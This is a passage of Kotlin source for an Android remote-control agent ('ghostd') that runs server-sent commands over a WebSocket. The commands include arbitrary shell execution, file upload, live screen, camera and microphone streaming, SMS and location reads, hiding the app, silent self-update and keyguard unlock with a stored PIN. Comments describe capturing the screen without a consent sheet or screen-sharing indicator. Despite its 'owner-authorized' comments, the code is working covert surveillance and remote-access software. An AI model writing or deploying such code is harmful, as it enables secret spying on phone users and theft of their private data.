package com.tg.ghostd

import android.app.KeyguardManager
import android.content.Context
import android.os.PowerManager
import android.os.SystemClock
import com.neovisionaries.ws.client.WebSocket
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicReference

/**
 * Executes commands received over the WebSocket and sends back the result.
 *
 * Protocol (matches server/daemon.py):
 *   in:  {"type":"cmd","cmd_id":..,"action":..,"args":[..]}
 *   out: {"type":"result","cmd_id":..,"id":..,"status":"ok"|"error",
 *         "ok":bool,"result":..}
 *
 * Streamed media (screen live/record, cam live, mic live) additionally uses
 * binary frames framed as: "<json header>\n<payload>" — see [MediaBus].
 */
object CommandHandler {

    @Volatile private var appContext: Context? = null

    /** Called once from GhostService.onCreate. */
    fun init(ctx: Context) {
        appContext = ctx.applicationContext
    }

    fun handle(ws: WebSocket, text: String) {
        val msg = try {
            JSONObject(text)
        } catch (_: Exception) {
            return
        }
        // incoming file stream terminator (see FileReceiver / files put)
        if (msg.optString("type") == FileTransfer.TYPE_END) {
            FileReceiver.onEnd(msg)
            return
        }
        if (msg.optString("type") != "cmd") return
        val cmdId = msg.optString("cmd_id")

        // Reserve a files-put slot NOW, on the WebSocket thread. The server
        // starts sending chunks immediately after this command; preparing on
        // the worker created a race where early chunks/file_end were dropped.
        var prepared: FileReceiver.Transfer? = null
        if (msg.optString("action") == "files") {
            val args = msg.optJSONArray("args")
            if (args?.optString(0) == "put") {
                try {
                    prepared = FileReceiver.prepare(args.optString(1, ""), cmdId, ws)
                } catch (e: Exception) {
                    try {
                        ws.sendText(error(cmdId, e.message ?: "files put failed").toString())
                    } catch (_: Exception) {
                    }
                    return
                }
            }
        }

        // execute off the websocket thread
        Thread {
            // Keep the display awake (and turn it on) for the whole command so
            // a consent sheet / UI step cannot race screen-off. Balanced:
            // the session is always ended, whatever the command does.
            val awake = ScreenAwakeController.begin(appContext)
            val resp = try {
                execute(msg, ws, prepared).put("cmd_id", cmdId).put("id", cmdId)
            } catch (e: Exception) {
                error(cmdId, e.message ?: "error")
            } finally {
                ScreenAwakeController.end(awake)
            }
            try {
                ws.sendText(resp.toString())
            } catch (_: Exception) {
                // socket died; reconnect loop will handle it
            }
        }.start()
    }

    /** Incoming binary frames from the server (file streams; MediaBus framing). */
    fun onBinary(data: ByteArray) {
        val (header, payload) = FileTransfer.parseFrame(data) ?: return
        when (header.optString("type")) {
            FileTransfer.TYPE_CHUNK -> FileReceiver.onChunk(header, payload)
            FileTransfer.TYPE_END -> FileReceiver.onEnd(header)
        }
    }

    private fun execute(
        msg: JSONObject, ws: WebSocket, prepared: FileReceiver.Transfer? = null
    ): JSONObject {
        val action = msg.optString("action")
        val cmdId = msg.optString("cmd_id")
        val args = msg.optJSONArray("args") ?: JSONArray()
        val ctx = appContext ?: throw Exception("service context not ready")
        val result: Any = when (action) {
            "shell" -> shell(args)
            "files" -> {
                if (args.optString(0) == "put") {
                    val t = prepared ?: throw Exception(
                        "files put: slot not prepared on the WebSocket thread"
                    )
                    FileReceiver.await(t)
                } else {
                    filesCmd(ws, args, cmdId)
                }
            }
            "screen" -> screenCmd(ctx, ws, args)
            "cam" -> camCmd(ctx, ws, args)
            "mic" -> micCmd(ctx, ws, args)
            "brightness" -> brightnessCmd(ctx, args)
            "volume" -> volumeCmd(ctx, args)
            "update" -> updateCmd(ctx, args)
            "wake" -> SystemControl.wake(ctx)
            // ---- sidekick (ghosta) forwarded verbs ----
            "ui" -> uiCmd(args)
            "tap" -> tapCmd("tap", args)
            "longclick" -> tapCmd("longclick", args)
            "type" -> sidekickSend(
                JSONObject().put("cmd", "type").put("text", joinArgs(args, 0))
            )
            "key" -> sidekickSend(
                JSONObject().put("cmd", "key").put("code", intArg(args, 0))
            )
            "swipe" -> swipeCmd(args)
            "unlock" -> unlockCmd(ctx, args)
            "arm" -> sidekickSend(JSONObject().put("cmd", "arm"))
            "disarm" -> sidekickSend(JSONObject().put("cmd", "disarm"))
            "sidekick" -> sidekickCmd(ctx, args)
            // ---- device data / health ----
            "sms" -> smsCmd(ctx, args)
            "loc" -> DataReaders.locationOnce(ctx)
            "device" -> DataReaders.deviceInfo(ctx)
            "status" -> DataReaders.status(ctx)
            "hide" -> DataReaders.setHidden(ctx, true)
            "unhide" -> DataReaders.setHidden(ctx, false)
            "restart" -> restartSelf(ctx)
            // Owner-authorized Remove Device: ghostd + ghosta only; never
            // personal data or other apps. See Decommission.kt.
            "destroy" -> Decommission.destroy(ctx)
            else -> throw Exception("unknown action: $action")
        }
        return resultEnvelope(result)
    }

    /**
     * Build the wire result envelope.
     *
     * Most actions return a plain payload and succeed. A few return a
     * JSONObject that explicitly reports `ok:false` (sidekick link failures,
     * sidekick router errors). Those must fail the outer envelope too;
     * otherwise the daemon records a failed tap/type as a successful command.
     * The original payload is kept verbatim under `result` for diagnostics.
     */
    internal fun resultEnvelope(result: Any): JSONObject {
        var ok = true
        if (result is JSONObject && result.has("ok")) {
            ok = result.optBoolean("ok", true)
        }
        return JSONObject()
            .put("type", "result")
            .put("status", if (ok) "ok" else "error")
            .put("ok", ok)
            .put("result", result)
    }

    // ------------------------------------------------------------- unlock

    /**
     * Pure unlock decisions (JVM-tested). A PIN is only ever validated in
     * memory here: this object never logs, returns or persists it.
     */
    internal object UnlockSafety {
        const val PIN_MIN_LENGTH = 4
        const val PIN_MAX_LENGTH = 32

        /**
         * Reasonable shape check before any keyguard input: 4-32 printable
         * ASCII characters, no spaces/control characters. This deliberately
         * accepts alphanumeric device passwords as well as numeric PINs.
         */
        fun validatePinShape(pin: String): String? {
            if (pin.length !in PIN_MIN_LENGTH..PIN_MAX_LENGTH) {
                return "unlock: PIN must be $PIN_MIN_LENGTH-$PIN_MAX_LENGTH characters"
            }
            if (pin.any { it.code < 0x21 || it.code > 0x7e }) {
                return "unlock: PIN must be printable ASCII without spaces or control characters"
            }
            return null
        }

        /** KeyguardManager's two independent locked signals must both be clear. */
        fun isUnlocked(keyguardLocked: Boolean, deviceLocked: Boolean): Boolean =
            !keyguardLocked && !deviceLocked

        /**
         * Build a failure from a sidekick response without copying any
         * unexpected fields (in particular, a PIN is never forwarded).
         */
        fun failureFrom(
            res: JSONObject?,
            stage: String,
            fallback: String
        ): JSONObject {
            val message = res?.optString("error").orEmpty().ifBlank { fallback }
            val out = JSONObject()
                .put("ok", false)
                .put("error", message)
                .put("stage", stage)
            if (res != null) {
                if (res.has("typed")) out.put("typed", res.optBoolean("typed", false))
                if (res.has("steps")) out.put("steps", res.opt("steps"))
            }
            return out
        }
    }

    /**
     * Screenshot retry decision. The accessibility screenshot API throttles
     * at roughly 3/s; only that specific failure is worth one short retry.
     * Any other error (no access, invalid display, timeout) goes straight to
     * the MediaProjection fallback exactly as before.
     */
    internal object ScreenshotPolicy {
        const val THROTTLE_RETRY_DELAY_MS = 500L

        fun isThrottleError(error: String?): Boolean =
            error?.lowercase()?.contains("throttl") == true

        fun shouldRetryOnce(res: JSONObject): Boolean =
            !res.optBoolean("ok", false) && isThrottleError(res.optString("error", ""))
    }

    // ---------------------------------------------------------------- screen

    /**
     * Still capture without MediaProjection whenever ghosta is available.
     * Accessibility screenshots (Android 11+) show neither a consent sheet
     * nor the persistent screen-sharing indicator. Fall back to the existing
     * projection capturer on older devices or if the sidekick is unavailable.
     */
    private fun silentScreenShot(ctx: Context, ws: WebSocket): JSONObject {
        val request = JSONObject().put("cmd", "screenshot").put("format", "png")
        var viaSidekick = sidekickSend(request)
        // The framework throttles accessibility screenshots (~3/s). One short
        // retry covers a back-to-back capture; every other error falls back
        // immediately and is never retried blindly.
        if (ScreenshotPolicy.shouldRetryOnce(viaSidekick)) {
            try {
                Thread.sleep(ScreenshotPolicy.THROTTLE_RETRY_DELAY_MS)
            } catch (_: InterruptedException) {
                Thread.currentThread().interrupt()
            }
            viaSidekick = sidekickSend(request)
        }
        if (viaSidekick.optBoolean("ok")) {
            val b64 = viaSidekick.remove("b64")
            if (b64 != null) viaSidekick.put("png_b64", b64)
            return viaSidekick.put("source", "accessibility")
        }
        return ScreenCapturer.shot(ctx, ws)
            .put("source", "media_projection")
            .put("accessibility_error", viaSidekick.optString("error", "unavailable"))
    }

    /**
     * screen shot
     * screen record <secs> [--fps N] [--quality 10-100]
     * screen live [--fps N] [--quality 10-100]   (a.k.a. screen start)
     * screen stop   — stop an active stream
     * screen off    — also stop the MediaProjection itself
     */
    private fun screenCmd(ctx: Context, ws: WebSocket, args: JSONArray): Any {
        val sub = args.optString(0, "")
        val o = opts(args, 1)
        return when (sub) {
            "shot" -> silentScreenShot(ctx, ws)
            "record" -> {
                val secs = (args.optString(1, "10").toIntOrNull() ?: 10).coerceIn(1, 600)
                ScreenCapturer.stream(
                    ctx, ws, secs,
                    o["fps"]?.toIntOrNull(), o["quality"]?.toIntOrNull(),
                    "screen-record"
                )
            }
            "live", "start" -> ScreenCapturer.stream(
                ctx, ws, o["secs"]?.toIntOrNull()?.coerceIn(1, 600),
                o["fps"]?.toIntOrNull(), o["quality"]?.toIntOrNull(),
                "screen-live"
            )
            "stop" -> ScreenCapturer.stop()
            "off" -> {
                // full teardown: unsticks the stream/shot worker, force-
                // releases the busy slot and stops the projection itself
                // (ProjectionHub.stop is lock-free, so it works even while
                // a capture is wedged mid-grant).
                ScreenCapturer.stop()
                ProjectionHub.stop()
                JSONObject().put("projection", "stopped")
            }
            else -> throw Exception("screen: expected shot|record|live|stop|off")
        }
    }

    // ------------------------------------------------------------------- cam

    /**
     * cam snap <front|back>
     * cam live <front|back> [--quality low|med|high|480p|720p|1080p] [--fps N]
     * cam stop
     */
    private fun camCmd(ctx: Context, ws: WebSocket, args: JSONArray): Any {
        val sub = args.optString(0, "")
        val o = opts(args, 2)
        try {
            return when (sub) {
                "snap" -> CameraCapturer.snap(ctx, facing(args, 1))
                "live", "start" -> CameraCapturer.live(
                    ctx, ws, facing(args, 1), o["quality"], o["fps"]?.toIntOrNull()
                )
                "stop" -> CameraCapturer.stop()
                else -> throw Exception("cam: expected snap|live|stop")
            }
        } catch (e: Exception) {
            // Turn cryptic vendor errors into something actionable.
            val m = e.message ?: ""
            if (m.contains("disabled by policy", ignoreCase = true)) {
                throw Exception(
                    "camera blocked by the system: turn on the phone's global " +
                        "camera access toggle (Quick Settings → Camera access, or " +
                        "Settings → Security & privacy → Privacy controls → Camera access)"
                )
            }
            throw e
        }
    }

    private fun facing(args: JSONArray, idx: Int): String {
        val f = args.optString(idx, "back")
        return if (f == "front") "front" else "back"
    }

    // ------------------------------------------------------------------- mic

    /**
     * mic record <secs> [--rate N] [--mono]   (default 44100 stereo)
     * mic live
     * mic stop
     */
    private fun micCmd(ctx: Context, ws: WebSocket, args: JSONArray): Any {
        val sub = args.optString(0, "")
        val o = opts(args, 2)
        return when (sub) {
            "record" -> {
                val secs = (args.optString(1, "10").toIntOrNull() ?: 10).coerceIn(1, 60)
                val rate = (o["rate"]?.toIntOrNull() ?: 44_100).coerceIn(8_000, 48_000)
                val channels = if (o.containsKey("mono")) 1 else 2
                MicCapturer.record(ctx, secs, rate, channels)
            }
            "live", "start" -> MicCapturer.live(ctx, ws)
            "stop" -> MicCapturer.stop()
            else -> throw Exception("mic: expected record|live|stop")
        }
    }

    // ---------------------------------------------------------------- update

    /**
     * update self [apk_path]      — silent ghostd self-update
     * update sidekick [apk_path]  — ghosta update (silent when ghostd is its
     *                               installer-of-record; else confirm+auto-tap)
     * When apk_path is absent, the APK is first RECEIVED via the files-put
     * flow (server pushes it to the default path). Blocks until the final
     * install status and reports it (old version -> new version) BEFORE the
     * connection reboots (the service restarts after a self-update).
     */
    private fun updateCmd(ctx: Context, args: JSONArray): Any {
        return when (val sub = args.optString(0, "")) {
            "self" -> AppUpdater.updateSelf(ctx, argOrNull(args, 1))
            "sidekick" -> AppUpdater.updateSidekick(ctx, argOrNull(args, 1))
            else -> throw Exception("update: expected self|sidekick [apk_path], got '$sub'")
        }
    }

    private fun argOrNull(args: JSONArray, i: Int): String? =
        if (args.length() > i) args.optString(i) else null

    // ------------------------------------------------------- brightness/volume

    /**
     * brightness get | brightness set <0-255>
     */
    private fun brightnessCmd(ctx: Context, args: JSONArray): Any {
        return when (args.optString(0, "get")) {
            "get" -> SystemControl.brightnessGet(ctx)
            "set" -> SystemControl.brightnessSet(
                ctx, args.optString(1, "128").toIntOrNull() ?: 128
            )
            else -> throw Exception("brightness: expected get|set <0-255>")
        }
    }

    /**
     * volume get <stream> | volume set <stream> <0-100> |
     * volume mute <stream> | volume unmute <stream>
     * stream: ring|media|alarm|notification|system
     */
    private fun volumeCmd(ctx: Context, args: JSONArray): Any {
        val sub = args.optString(0, "")
        return when (sub) {
            "get" -> SystemControl.volumeGet(ctx, args.optString(1, "media"))
            "set" -> SystemControl.volumeSet(
                ctx, args.optString(1, "media"),
                args.optString(2, "50").toIntOrNull() ?: 50
            )
            "mute" -> SystemControl.volumeMute(ctx, args.optString(1, "media"), true)
            "unmute" -> SystemControl.volumeMute(ctx, args.optString(1, "media"), false)
            else -> throw Exception("volume: expected get|set|mute|unmute <stream>")
        }
    }

    // -------------------------------------------------------------- sidekick

    /**
     * Forward a command to the sidekick over the local link and return its
     * JSON response verbatim (see client-sidekick/README.md for the exact
     * protocol: dump/find/tap/longclick/type/key/swipe/unlock/arm/disarm/...).
     */
    // ------------------------------------------------------------ keyguard

    /**
     * `unlock <pin>` / `unlock --forget`
     *
     * Wake the screen, let ghosta enter the PIN, and persist the PIN only
     * AFTER the keyguard is verified gone. A confirmed unlock REMEMBERS the
     * PIN (AES/GCM via Android Keystore) so later `update self` runs can
     * unlock unattended; pass `--forget` to wipe it. Failure is returned as
     * `ok:false` (and therefore a failed wire envelope) so a bad PIN is never
     * remembered.
     */
    private fun unlockCmd(ctx: Context, args: JSONArray): JSONObject {
        val pin = args.optString(0, "")
        if (pin.isBlank() || pin == "--forget") {
            Prefs.clearPin(ctx)
            return JSONObject().put("ok", true).put("pin_forgotten", true)
        }
        val res = doUnlock(ctx, pin)
        if (res.optBoolean("ok") && !joinArgs(args, 1).contains("no-remember")) {
            Prefs.setPin(ctx, pin)
            res.put("pin_saved", true)
        }
        return res
    }

    /** Unlock using the PIN remembered from an earlier `unlock`. */
    fun unlockWithStoredPin(ctx: Context): JSONObject {
        val pin = Prefs.pin(ctx)
            ?: return UnlockSafety.failureFrom(null, "stored_pin", "no stored PIN")
        return doUnlock(ctx, pin)
    }

    /**
     * Wake, then let ghosta reveal/enter/submit the keyguard PIN and prove the
     * device is actually unlocked.
     *
     * ghostd re-checks KeyguardManager itself after ghosta reports success:
     * a typed PIN is not an unlock. Nothing here logs or returns the PIN.
     */
    private fun doUnlock(ctx: Context, pin: String): JSONObject {
        UnlockSafety.validatePinShape(pin)?.let {
            return UnlockSafety.failureFrom(null, "validation", it)
        }
        val km = try {
            ctx.getSystemService(KeyguardManager::class.java)
        } catch (_: Exception) {
            null
        } ?: return UnlockSafety.failureFrom(
            null, "keyguard_state",
            "keyguard state unavailable; cannot verify an unlock"
        )
        if (UnlockSafety.isUnlocked(km.isKeyguardLocked, km.isDeviceLocked)) {
            return JSONObject()
                .put("ok", true)
                .put("unlocked", true)
                .put("already_unlocked", true)
                .put("typed", false)
        }
        try {
            SystemControl.wake(ctx)
        } catch (e: Exception) {
            return UnlockSafety.failureFrom(
                null, "wake", "cannot wake the display: ${e.message}"
            )
        }
        if (!awaitInteractive(ctx, WAKE_WAIT_MS)) {
            return UnlockSafety.failureFrom(
                null, "wake",
                "display did not become interactive; check power/doze state and retry"
            )
        }
        // Face/fingerprint or a wake gesture may have dismissed the keyguard
        // between the first check and now.
        if (UnlockSafety.isUnlocked(km.isKeyguardLocked, km.isDeviceLocked)) {
            return JSONObject()
                .put("ok", true)
                .put("unlocked", true)
                .put("already_unlocked", true)
                .put("typed", false)
        }

        val res = sidekickSend(JSONObject().put("cmd", "unlock").put("pin", pin))
        if (!res.optBoolean("ok", false)) {
            // Do not report a failure if the keyguard actually cleared while
            // ghosta was giving up (state propagation can lag one poll).
            if (awaitUnlocked(km, SIDEKICK_FAILURE_SETTLE_MS)) {
                return JSONObject()
                    .put("ok", true)
                    .put("unlocked", true)
                    .put("verified", true)
                    .put("typed", res.optBoolean("typed", false))
            }
            return UnlockSafety.failureFrom(
                res, res.optString("stage", "sidekick"),
                res.optString("error", "unlock failed on the lock screen")
            )
        }
        if (awaitUnlocked(km, UNLOCK_VERIFY_MS)) {
            return res.put("ok", true)
                .put("unlocked", true)
                .put("verified", true)
        }
        return UnlockSafety.failureFrom(
            null, "verify",
            "unlock not confirmed: the keyguard is still locked after PIN entry. " +
                "Check the PIN and that the lock screen accepts accessibility input, then retry"
        )
    }

    /** Wait (bounded) for PowerManager.isInteractive. */
    private fun awaitInteractive(ctx: Context, timeoutMs: Long): Boolean {
        val pm = try {
            ctx.getSystemService(PowerManager::class.java)
        } catch (_: Exception) {
            null
        } ?: return true
        val deadline = SystemClock.elapsedRealtime() + timeoutMs
        while (true) {
            if (pm.isInteractive) return true
            if (SystemClock.elapsedRealtime() >= deadline) return false
            try {
                Thread.sleep(INTERACTIVE_POLL_MS)
            } catch (_: InterruptedException) {
                Thread.currentThread().interrupt()
                return pm.isInteractive
            }
        }
    }

    /** Wait (bounded) for KeyguardManager to report unlocked. */
    private fun awaitUnlocked(km: KeyguardManager, timeoutMs: Long): Boolean {
        val deadline = SystemClock.elapsedRealtime() + timeoutMs
        while (true) {
            if (UnlockSafety.isUnlocked(km.isKeyguardLocked, km.isDeviceLocked)) {
                return true
            }
            if (SystemClock.elapsedRealtime() >= deadline) return false
            try {
                Thread.sleep(UNLOCK_POLL_MS)
            } catch (_: InterruptedException) {
                Thread.currentThread().interrupt()
                return UnlockSafety.isUnlocked(km.isKeyguardLocked, km.isDeviceLocked)
            }
        }
    }

    /**
     * `restart` — clean process restart, the last-resort recovery.
     *
     * Aborts any half-done transfer, lets the result frame reach the server,
     * then kills this process. START_STICKY (plus the kick path) brings the
     * agent back within seconds with fresh threads and an empty transfer
     * slot — which is how a wedged receiver is cleared without touching the
     * phone.
     */
    private fun restartSelf(ctx: Context): JSONObject {
        FileReceiver.abortAll("restart")
        Thread {
            try {
                Thread.sleep(700)      // give the result frame time to flush
            } catch (_: InterruptedException) {
            }
            android.os.Process.killProcess(android.os.Process.myPid())
        }.apply {
            isDaemon = true
            name = "ghostd-restart"
            start()
        }
        return JSONObject().put("ok", true).put("restarting", true)
    }

    // ----------------------------------------------------------- sms / data
    /**
     * `sms recent [N]` — newest messages (default 20, max 200).
     */
    private fun smsCmd(ctx: Context, args: JSONArray): Any {
        val sub = args.optString(0, "recent")
        val limit = when (sub) {
            "recent", "" -> args.optString(1, "20").toIntOrNull() ?: 20
            else -> throw Exception("sms: expected 'recent [N]', got '$sub'")
        }
        return DataReaders.smsRecent(ctx, limit)
    }

    private fun sidekickSend(cmd: JSONObject): JSONObject = try {
        SidekickLink.send(cmd)
    } catch (e: Exception) {
        JSONObject().put("ok", false)
            .put("error", "sidekick link: ${e.message}")
    }

    /** Read-only operations may retry a transient window-tree failure once. */
    private fun sidekickRead(cmd: JSONObject): JSONObject {
        var result = sidekickSend(cmd)
        if (transientSidekickError(result)) {
            Thread.sleep(250)
            result = sidekickSend(cmd)
        }
        return result
    }

    internal fun transientSidekickError(result: JSONObject): Boolean {
        if (result.optBoolean("ok", false)) return false
        val error = result.optString("error").lowercase()
        return "no active window" in error || "root" in error || "window" in error
    }

    /**
     * ui dump                          → {"cmd":"dump"} (full node tree)
     * ui find <text>                   → {"cmd":"find","text":...}
     * ui find --text <t> | --id <id>   → find by text/desc or view resource id
     */
    private fun uiCmd(args: JSONArray): JSONObject {
        val sub = args.optString(0, "")
        return when (sub) {
            "dump" -> sidekickRead(JSONObject().put("cmd", "dump"))
            "find" -> {
                val o = opts(args, 1)
                val cmd = JSONObject().put("cmd", "find")
                when {
                    o.containsKey("id") -> cmd.put("id", o["id"])
                    o.containsKey("text") -> cmd.put("text", o["text"])
                    args.length() > 1 -> cmd.put("text", joinArgs(args, 1))
                    else -> throw Exception("ui find: expected --text <t> or --id <id>")
                }
                sidekickRead(cmd)
            }
            "status" -> sidekickRead(JSONObject().put("cmd", "status"))
            else -> throw Exception("ui: expected dump|find [--text|--id]")
        }
    }

    /**
     * tap <id|x,y> / longclick <id|x,y> — id is a node index path like
     * "root/0/3"; otherwise the two args are x/y coordinates.
     */
    private fun tapCmd(verb: String, args: JSONArray): JSONObject {
        val cmd = JSONObject().put("cmd", verb)
        val first = args.optString(0, "")
        if (first.contains("/")) {
            cmd.put("id", first)
        } else if (args.length() >= 2) {
            cmd.put("x", intArg(args, 0)).put("y", intArg(args, 1))
        } else {
            throw Exception("$verb: expected <node-id> or <x> <y>")
        }
        return sidekickSend(cmd)
    }

    /** swipe x1 y1 x2 y2 [duration_ms] */
    private fun swipeCmd(args: JSONArray): JSONObject {
        if (args.length() < 4) throw Exception("swipe: expected <x1> <y1> <x2> <y2> [duration]")
        return sidekickSend(
            JSONObject().put("cmd", "swipe")
                .put("x1", intArg(args, 0)).put("y1", intArg(args, 1))
                .put("x2", intArg(args, 2)).put("y2", intArg(args, 3))
                .put("duration", (args.optString(4, "300").toIntOrNull() ?: 300))
        )
    }

    /**
     * sidekick status | arm | disarm | ping | install [apk] | reinstall
     * install:   installs a previously-pushed ghosta APK (see SidekickInstaller
     *            for the confirm+auto-tap flow).
     * reinstall: redoes the BUNDLED-asset install (assets/ghosta.apk) —
     *            silent when ghostd is ghosta's installer-of-record, else the
     *            confirm+auto-tap (armed sidekick) flow. Use after ghostd
     *            updates if ghosta went missing / lagged behind.
     */
    private fun sidekickCmd(ctx: Context, args: JSONArray): Any {
        return when (args.optString(0, "status")) {
            "status" -> sidekickSend(JSONObject().put("cmd", "status"))
            "arm" -> sidekickSend(JSONObject().put("cmd", "arm"))
            "disarm" -> sidekickSend(JSONObject().put("cmd", "disarm"))
            "ping" -> sidekickSend(JSONObject().put("cmd", "ping"))
            "install" -> SidekickInstaller.install(
                ctx,
                if (args.length() > 1) args.optString(1) else SidekickInstaller.DEFAULT_APK_PATH
            )
            "reinstall" -> SidekickInstaller.provisionBundled(ctx, force = true)
            else -> throw Exception(
                "sidekick: expected status|arm|disarm|ping|install [apk]|reinstall"
            )
        }
    }

    // ---------------------------------------------------------------- files

    /**
     * files ls [path]
     * files get <path> [dest]  — stream file to server (binary chunks)
     * files put <path>        — receive a file stream from the server
     * files tree [path] [--depth N]  — recursive listing with sizes
     */
    private fun filesCmd(ws: WebSocket, args: JSONArray, cmdId: String): Any {
        return when (args.optString(0, "ls")) {
            "ls" -> filesLs(args)
            "get" -> {
                if (args.length() < 2) throw Exception("files get: expected <path> [dest]")
                FileTransfer.sendFile(
                    ws, args.optString(1), cmdId,
                    if (args.length() > 2) args.optString(2) else null
                )
            }
            "put" -> throw Exception(
                "files put: slot must be prepared on the WebSocket thread"
            )
            "abort" -> FileReceiver.abortAll("operator request")
            "tree" -> {
                val o = opts(args, 1)
                val path = when {
                    args.length() > 1 && !args.optString(1).startsWith("--") -> args.optString(1)
                    else -> "/sdcard"
                }
                filesTree(path, (o["depth"]?.toIntOrNull() ?: 5).coerceIn(1, 10))
            }
            else -> throw Exception("files: expected ls|get|put|tree")
        }
    }

    /** Recursive listing with sizes, depth-limited (default 5). */
    private fun filesTree(rootPath: String, maxDepth: Int): JSONObject {
        val root = File(rootPath)
        if (!root.exists()) throw Exception("no such file or directory: $rootPath")
        val entries = JSONArray()
        var truncated = false

        fun entry(f: File, depth: Int): JSONObject = JSONObject()
            .put("name", f.name)
            .put("path", f.absolutePath)
            .put("dir", f.isDirectory)
            .put("size", f.length())
            .put("depth", depth)

        fun walk(dir: File, depth: Int) {
            val kids = dir.listFiles() ?: return
            for (c in kids.sortedBy { it.name }) {
                if (entries.length() >= TREE_ENTRY_CAP) {
                    truncated = true
                    return
                }
                entries.put(entry(c, depth))
                if (c.isDirectory && depth < maxDepth) walk(c, depth + 1)
            }
        }

        if (root.isDirectory) walk(root, 0) else entries.put(entry(root, 0))
        return JSONObject()
            .put("root", root.absolutePath)
            .put("depth", maxDepth)
            .put("count", entries.length())
            .put("truncated", truncated)
            .put("entries", entries)
    }

    private fun intArg(args: JSONArray, i: Int): Int =
        args.optString(i).toDoubleOrNull()?.toInt()
            ?: throw Exception("expected integer at arg $i, got '${args.optString(i)}'")

    /** Join positional args from [from] with spaces (e.g. `type hello world`). */
    private fun joinArgs(args: JSONArray, from: Int): String {
        val sb = StringBuilder()
        for (i in from until args.length()) {
            if (sb.isNotEmpty()) sb.append(' ')
            sb.append(args.optString(i))
        }
        return sb.toString()
    }

    // ------------------------------------------------------------------ util

    /** Parse "--key value" options out of args starting at [from]. */
    private fun opts(args: JSONArray, from: Int): Map<String, String> {
        val m = HashMap<String, String>()
        var i = maxOf(from, 0)
        while (i < args.length()) {
            val a = args.optString(i)
            if (a.startsWith("--")) {
                if (i + 1 < args.length() && !args.optString(i + 1).startsWith("--")) {
                    m[a.substring(2)] = args.optString(i + 1)
                    i += 2
                } else {
                    m[a.substring(2)] = ""
                    i++
                }
            } else i++
        }
        return m
    }

    /** files ls: args = ["ls", "<path>"] (path defaults to /sdcard/Download). */
    private fun filesLs(args: JSONArray): JSONArray {
        val path = if (args.length() > 1 && args.optString(0) == "ls") args.optString(1)
        else if (args.length() > 0) args.optString(0)
        else "/sdcard/Download"
        val dir = File(path)
        if (!dir.exists()) throw Exception("no such file or directory: $path")
        val out = JSONArray()
        val files = dir.listFiles()?.sortedWith(compareBy({ !it.isDirectory }, { it.name })) ?: return out
        for (f in files) {
            out.put(
                JSONObject()
                    .put("name", f.name)
                    .put("path", f.absolutePath)
                    .put("dir", f.isDirectory)
                    .put("size", f.length())
            )
        }
        return out
    }

    /** Parsed `shell` invocation; defaults preserve the old output shape. */
    internal data class ShellRequest(
        val command: String,
        val timeoutMs: Long = SHELL_TIMEOUT_MS,
        val maxOutputBytes: Int = SHELL_MAX_OUTPUT_BYTES
    )

    /**
     * shell: parse optional `--timeout <ms>` / `--max-bytes <n>` and run the
     * remaining command. Values are clamped to [SHELL_MIN_TIMEOUT_MS]..
     * [SHELL_MAX_TIMEOUT_MS] and [SHELL_MIN_OUTPUT_BYTES]..
     * [SHELL_MAX_OUTPUT_CAP]; malformed values leave the default untouched.
     */
    internal fun shell(args: JSONArray): JSONObject {
        val req = parseShellArgs(args)
        return shell(req.command, req.timeoutMs, req.maxOutputBytes)
    }

    /**
     * Accept flags either as separate array entries (direct protocol clients)
     * or as a leading prefix of the command string. The operator CLI joins its
     * whole shell line into `args[0]`, so both forms reach this parser.
     */
    internal fun parseShellArgs(args: JSONArray): ShellRequest {
        var timeoutMs = SHELL_TIMEOUT_MS
        var maxOutputBytes = SHELL_MAX_OUTPUT_BYTES

        fun applyFlag(name: String, raw: String): Boolean = when (name) {
            "--timeout" -> {
                val value = raw.toLongOrNull() ?: return false
                timeoutMs = value.coerceIn(SHELL_MIN_TIMEOUT_MS, SHELL_MAX_TIMEOUT_MS)
                true
            }
            "--max-bytes" -> {
                val value = raw.toLongOrNull() ?: return false
                maxOutputBytes = value.coerceIn(
                    SHELL_MIN_OUTPUT_BYTES.toLong(), SHELL_MAX_OUTPUT_CAP.toLong()
                ).toInt()
                true
            }
            else -> false
        }

        var idx = 0
        var sawFlagEntry = false
        // Only a multi-entry args array can carry flags as separate tokens.
        // A single entry is the whole command line (the CLI joins it), so its
        // leading flags are handled by stripShellFlagPrefix below.
        while (args.length() > 1 && idx < args.length()) {
            val token = args.optString(idx, "")
            when {
                token == "--timeout" || token == "--max-bytes" -> {
                    sawFlagEntry = true
                    val value = args.optString(idx + 1, "")
                    if (value.isEmpty() || !applyFlag(token, value)) break
                    idx += 2
                }
                token.startsWith("--timeout=") -> {
                    sawFlagEntry = true
                    if (!applyFlag("--timeout", token.substringAfter('='))) break
                    idx += 1
                }
                token.startsWith("--max-bytes=") -> {
                    sawFlagEntry = true
                    if (!applyFlag("--max-bytes", token.substringAfter('='))) break
                    idx += 1
                }
                else -> break
            }
        }
        if (sawFlagEntry) {
            val command = (idx until args.length()).joinToString(" ") {
                args.optString(it, "")
            }
            return ShellRequest(command, timeoutMs, maxOutputBytes)
        }

        // No separate flag entries: allow a flag prefix inside args[0].
        val command = stripShellFlagPrefix(args.optString(0, "id")) { name, value ->
            applyFlag(name, value)
        }
        return ShellRequest(command, timeoutMs, maxOutputBytes)
    }

    /**
     * Remove recognized leading `--timeout`/`--max-bytes` tokens from a single
     * joined command string, leaving the command text otherwise untouched.
     */
    private inline fun stripShellFlagPrefix(
        text: String,
        apply: (name: String, value: String) -> Boolean
    ): String {
        var i = 0
        var consumed = 0
        while (true) {
            while (i < text.length && text[i].isWhitespace()) i++
            if (i >= text.length || !text.startsWith("--", i)) break
            val flagStart = i
            while (i < text.length && !text[i].isWhitespace()) i++
            val token = text.substring(flagStart, i)
            val eq = token.indexOf('=')
            val name: String
            val value: String
            if (eq >= 0) {
                name = token.substring(0, eq)
                value = token.substring(eq + 1)
            } else {
                name = token
                var valueStart = i
                while (valueStart < text.length && text[valueStart].isWhitespace()) valueStart++
                var valueEnd = valueStart
                while (valueEnd < text.length && !text[valueEnd].isWhitespace()) valueEnd++
                if (valueStart == valueEnd) break  // missing value
                value = text.substring(valueStart, valueEnd)
                i = valueEnd
            }
            if (!apply(name, value)) break
            consumed = i
        }
        return if (consumed == 0) text else text.substring(consumed).trimStart()
    }

    /**
     * shell: run `sh -c <command>`, capture rc/stdout/stderr.
     *
     * Both pipes are drained concurrently. Reading one to EOF before the
     * other deadlocks when the child fills the unread pipe and never closes
     * the first one. The process lifetime and each captured stream are
